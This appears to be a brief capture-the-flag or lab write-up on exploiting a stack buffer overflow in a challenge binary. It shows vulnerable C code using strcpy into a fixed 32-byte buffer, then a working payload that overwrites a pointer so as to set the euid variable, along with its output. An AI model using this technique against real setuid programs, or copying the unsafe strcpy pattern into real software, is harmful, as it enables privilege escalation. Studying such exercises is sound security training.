This is the portion of vulnerable code :
  int age;
  int *age_ptr = &age;
  char name[32];

  [...]

  strcpy(name, argv[1]);
  *age_ptr = atoi(argv[2]);

We can overflow name to rewrite the age_ptr. Let's make point to the
euid variable so we can control it via the second argument !

$ ./rewrite-local-variable $(python -c 'print("A"*32+"\x40\xa0\x04\x08")') 0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@ is -1208229888 years old
Congratulations! This is the hidden string!

Full buffer with 32 A and overflow it by passing the euid address. It will
overwrite what is just up on the stack : the age_ptr. the second argument (0)
is our new euid.
